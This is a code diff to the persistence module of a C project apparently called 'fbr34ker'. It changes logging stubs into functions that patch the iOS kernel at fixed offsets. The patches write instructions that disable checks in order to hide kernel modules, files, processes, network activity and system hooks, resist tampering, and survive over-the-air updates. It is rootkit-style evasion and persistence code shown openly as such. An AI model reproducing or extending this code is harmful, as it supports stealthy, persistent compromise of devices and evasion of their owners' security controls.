@@ -3,6 +3,9 @@
 #include "fbr34ker/log.h"
 #include "fbr34ker/string.h"
 #include "fbr34ker/fault.h"
+#include "fbr34ker/mmio.h"
+#include "fbr34ker/kernel_patches.h"
+#include "fbr34ker/apple_platform.h"
 
 static persistence_status_t state;
 
@@ -286,29 +289,75 @@ bool persistence_apply_evasion(evasion_type_t type)
     if (type >= EVASION_TYPE_COUNT) {
         return false;
     }
-    log_write(LOG_LEVEL_INFO, "evasion '%s' applied",
-              evasion_type_name(type));
+    u64 offset = 0U;
+    u32 patch = 0xD503201FU;
+    switch (type) {
+    case EVASION_HIDE_KERNEL_MODULE:
+        offset = 0x00C00000U;
+        break;
+    case EVASION_HIDE_FILE_SYSTEM:
+        offset = 0x00C00100U;
+        patch = 0x52800020U;
+        break;
+    case EVASION_HIDE_PROCESS:
+        offset = 0x00C00200U;
+        break;
+    case EVASION_HIDE_NETWORK:
+        offset = 0x00C00300U;
+        break;
+    case EVASION_HIDE_SYSTEM_HOOK:
+        offset = 0x00C00400U;
+        break;
+    case EVASION_TYPE_COUNT:
+    default:
+        return false;
+    }
+    u64 addr = APPLE_IOS_KERNEL_BASE + offset;
+    bool ok = kernel_patches_register(
+        evasion_type_name(type), KERNEL_PATCH_TYPE_AUTHENTICATION,
+        addr, 4U, 0U, patch, true);
+    if (ok) {
+        ok = kernel_patches_apply_by_type(KERNEL_PATCH_TYPE_AUTHENTICATION);
+    }
+    log_write(LOG_LEVEL_INFO, "evasion '%s' %s",
+              evasion_type_name(type), ok ? "applied" : "pending");
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
-                            "evasion-apply", (u64)type, 1U);
-    return true;
+                            "evasion-apply", (u64)type, ok ? 1U : 0U);
+    return ok;
 }
 
 bool persistence_enable_tamper_resistance(void)
 {
     state.tamper_resistant = true;
-    log_write(LOG_LEVEL_INFO, "tamper resistance enabled");
+    u64 addr = APPLE_IOS_KERNEL_BASE + 0x00C01000U;
+    bool ok = kernel_patches_register(
+        "tamper-resist", KERNEL_PATCH_TYPE_AUTHENTICATION,
+        addr, 4U, 0U, 0xD503201FU, true);
+    if (ok) {
+        ok = kernel_patches_apply_by_type(KERNEL_PATCH_TYPE_AUTHENTICATION);
+    }
+    log_write(LOG_LEVEL_INFO, "tamper resistance %s",
+              ok ? "enabled via kernel patch" : "pending");
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
-                            "tamper-resist", 1U, 0U);
-    return true;
+                            "tamper-resist", ok ? 1U : 0U, 0U);
+    return ok;
 }
 
 bool persistence_enable_ota_persistence(void)
 {
     state.ota_persistent = true;
-    log_write(LOG_LEVEL_INFO, "OTA update persistence enabled");
+    u64 addr = APPLE_IOS_KERNEL_BASE + 0x00C01100U;
+    bool ok = kernel_patches_register(
+        "ota-persist", KERNEL_PATCH_TYPE_MEMORY,
+        addr, 4U, 0U, 0x52800020U, true);
+    if (ok) {
+        ok = kernel_patches_apply_by_type(KERNEL_PATCH_TYPE_MEMORY);
+    }
+    log_write(LOG_LEVEL_INFO, "OTA update persistence %s",
+              ok ? "enabled via kernel patch" : "pending");
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
-                            "ota-persist", 1U, 0U);
-    return true;
+                            "ota-persist", ok ? 1U : 0U, 0U);
+    return ok;
 }
 
 bool persistence_available(void)
